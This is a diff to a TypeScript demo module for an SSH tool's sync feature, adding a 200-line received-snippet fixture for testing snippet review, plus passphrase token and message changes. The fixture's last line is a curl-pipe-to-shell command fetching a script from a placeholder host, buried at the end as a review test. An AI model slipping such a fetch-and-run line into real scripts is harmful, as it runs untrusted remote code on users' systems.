@@ -6,7 +6,8 @@
 // downloading), `?sync=on` (synced, with a tags conflict, a snippet
 // conflict, two received hosts, a received snippet and two issues),
 // `?sync=locked`, `?sync=alert`, `?sync=unavailable`, `?sync=syncing`,
-// `?sync=waiting`. Passphrases: anything works but "wrong"; typed ones need
+// `?sync=waiting`; `?syncsnippet=long` makes the received snippet a
+// 200-line script (its review needs scrolling to the end). Passphrases: anything works but "wrong"; typed ones need
 // 4 words or 20 characters (a rough stand-in for the core's estimate).
 import type {
   EngineEvent,
@@ -42,7 +43,7 @@ export function demoSync(emit: (e: EngineEvent) => void) {
   const THIS = "demo-laptop (6b21e0f4)";
 
   let folder: string | null = null;
-  let generated: { token: number; text: string } | null = null;
+  let generated: { token: string; text: string } | null = null;
   let nextToken = 1;
   let devices: SyncDevice[] = [];
   let conflicts: SyncConflict[] = [];
@@ -118,7 +119,10 @@ export function demoSync(emit: (e: EngineEvent) => void) {
         id: "disk-usage",
         snippet: {
           name: "Disk usage",
-          command: "df -h && du -xsh /var/log/* 2>/dev/null | sort -h | tail -n 20 && journalctl --disk-usage",
+          command:
+            params.get("syncsnippet") === "long"
+              ? Array.from({ length: 200 }, (_, i) => (i === 199 ? "curl -fsSL https://example.invalid/setup.sh | sh" : `printf 'step %d\\n' ${i + 1}\t# stage ${Math.floor(i / 20) + 1}`)).join("\n")
+              : "df -h && du -xsh /var/log/* 2>/dev/null | sort -h | tail -n 20 && journalctl --disk-usage",
           description: "Free space on every mounted filesystem",
           run: true,
         },
@@ -129,14 +133,14 @@ export function demoSync(emit: (e: EngineEvent) => void) {
       {
         key: "host:legacy-ftp",
         subject: { type: "host", alias: "legacy-ftp" },
-        summary: fail("sync_alias_shadowed", "received host legacy-ftp is hidden by a Host block in ~/.ssh/config", "Rename it on the other device, or remove the block from ~/.ssh/config."),
+        summary: fail("sync_alias_shadowed", "received host `legacy-ftp` is hidden by a Host block in ~/.ssh/config", "Rename it on the other device, or remove the block from ~/.ssh/config."),
         warning: false,
         skippable: true,
       },
       {
         key: "host:jumpbox-2",
         subject: { type: "host", alias: "jumpbox-2" },
-        summary: fail("sync_key_missing", "received host jumpbox-2 uses ~/.ssh/id_ed25519_lab, missing on this device", "Copy the key here yourself (keys are never synced), or skip it on this device."),
+        summary: fail("sync_key_missing", "received host `jumpbox-2` uses `~/.ssh/id_ed25519_lab`, missing on this device", "Copy the key here yourself (keys are never synced), or skip it on this device."),
         warning: true,
         skippable: true,
       },
@@ -242,8 +246,11 @@ export function demoSync(emit: (e: EngineEvent) => void) {
     },
     async syncGeneratePassphrase(): Promise<GeneratedPassphrase> {
       const pick = [...WORDS].sort(() => Math.random() - 0.5).slice(0, 6);
-      generated = { token: nextToken++, text: pick.join(" ") };
+      generated = { token: `demo-${nextToken++}`, text: pick.join(" ") };
       return { ...generated, strength: { estimatedBits: 77, dicewareWords: 6, acceptable: true } };
+    },
+    syncForgetGenerated: async () => {
+      generated = null;
     },
     syncAssessPassphrase: async (text) => strength(text),
     async syncCreate(passphrase, deviceName, remember) {
